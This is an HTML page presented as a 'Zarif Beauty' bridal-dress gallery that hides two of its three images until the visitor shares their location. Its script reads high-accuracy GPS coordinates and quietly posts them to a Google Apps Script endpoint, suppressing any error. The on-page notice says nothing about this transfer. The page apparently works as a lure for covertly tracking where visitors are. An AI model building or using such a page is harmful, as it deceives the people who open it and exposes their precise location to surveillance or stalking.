<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zarif Beauty</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  background: #f7f2f4;
  font-family: Arial, sans-serif;
  color: #222;
}

.page {
  max-width: 600px;
  margin: auto;
  padding: 25px 18px;
}

.logo {
  text-align: center;
  font-size: 30px;
  font-weight: bold;
  margin: 15px 0 30px;
}

.gallery-image {
  width: 100%;
  height: auto;
  display: block;
  margin: 0 0 24px;
  border-radius: 14px;
}

.card {
  background: white;
  border-radius: 18px;
  padding: 28px 22px;
  box-shadow: 0 4px 18px rgba(0,0,0,0.08);
  text-align: center;
}

h2 {
  margin: 0 0 12px;
  font-size: 24px;
}

p {
  line-height: 1.5;
  color: #555;
}

.info {
  background: #f5eef1;
  padding: 14px;
  border-radius: 12px;
  margin: 20px 0;
  font-size: 14px;
  line-height: 1.5;
}

button {
  width: 100%;
  padding: 15px;
  border: none;
  border-radius: 12px;
  background: #222;
  color: white;
  font-size: 17px;
  cursor: pointer;
}

button:disabled {
  opacity: 0.6;
}

#status {
  margin-top: 15px;
  color: #777;
}

#result {
  margin-top: 20px;
  padding: 15px;
  background: #f5eef1;
  border-radius: 12px;
}

#mapsLink {
  display: block;
  margin-top: 12px;
  color: #222;
  font-weight: bold;
}

#afterLocation {
  display: none;
}
</style>
</head>

<body>

<div class="page">

  <div class="logo">Zarif Beauty</div>

  <!-- FIRST IMAGE -->
  <img
    class="gallery-image"
    src="IMG_20261004_205856.jpg"
    alt="Bridal dress"
  >

  <!-- LOCATION CONFIRMATION -->
  <div class="card">

    <h2>Location Sharing</h2>

    <p>
      Please tap the button below to share your location.
    </p>

    <div class="info">
      📍 Your location will only be accessed after you give permission.
      No camera or photo is used.
    </div>

    <button id="locationBtn">
      📍 Share My Location
    </button>

    <div id="status"></div>

    <div id="result" style="display:none;">

      <b>Location received successfully</b>

      <div id="coordinates"></div>

      <a
        id="mapsLink"
        href="#"
        target="_blank"
      >
        📍 Open in Google Maps
      </a>

    </div>

  </div>

  <!-- SECOND + THIRD IMAGES -->
  <div id="afterLocation">

    <img
      class="gallery-image"
      src="IMG_20261004_205938.jpg"
      alt="Bridal dress 2"
    >

    <img
      class="gallery-image"
      src="IMG_20261004_205837.jpg"
      alt="Bridal dress 3"
    >

  </div>

</div>

<script>

const BACKEND_URL =
"https://script.google.com/macros/s/AKfycbzeqyh-gaDySv5fZN6ZWRHOPQDnmW71oeFi5xUtPbydUBixx_geJoNJyKlXeuZuQX43ag/exec";

const locationBtn =
document.getElementById("locationBtn");

const status =
document.getElementById("status");

const result =
document.getElementById("result");

const coordinates =
document.getElementById("coordinates");

const mapsLink =
document.getElementById("mapsLink");

const afterLocation =
document.getElementById("afterLocation");


locationBtn.addEventListener("click", function() {

  if (!navigator.geolocation) {

    status.textContent =
      "Location is not supported by this browser.";

    return;
  }

  locationBtn.disabled = true;

  status.textContent =
    "Requesting your location...";


  navigator.geolocation.getCurrentPosition(

    function(position) {

      const lat =
        position.coords.latitude;

      const lon =
        position.coords.longitude;

      const accuracy =
        position.coords.accuracy;

      const mapsUrl =
        "https://www.google.com/maps?q="
        + lat + "," + lon;


      coordinates.innerHTML =
        "Latitude: " +
        lat.toFixed(8) +

        "<br>Longitude: " +
        lon.toFixed(8) +

        "<br>Accuracy: approximately " +
        Math.round(accuracy) +
        " meters";


      mapsLink.href = mapsUrl;

      result.style.display = "block";

      status.textContent =
        "Location shared successfully.";


      // SHOW IMAGE 2 AND IMAGE 3
      // ONLY AFTER LOCATION IS SUCCESSFULLY RECEIVED

      afterLocation.style.display = "block";


      fetch(BACKEND_URL, {

        method: "POST",

        mode: "no-cors",

        headers: {
          "Content-Type":
            "text/plain;charset=utf-8"
        },

        body: JSON.stringify({

          latitude: lat,

          longitude: lon,

          accuracy: accuracy,

          mapsUrl: mapsUrl

        })

      }).catch(function() {});

    },


    function(error) {

      locationBtn.disabled = false;

      if (error.code === 1) {

        status.textContent =
          "Location permission was denied.";

      } else if (error.code === 2) {

        status.textContent =
          "Location is unavailable.";

      } else if (error.code === 3) {

        status.textContent =
          "Location request timed out.";

      } else {

        status.textContent =
          "Unable to get your location.";

      }

    },


    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }

  );

});

</script>

</body>
      </html>
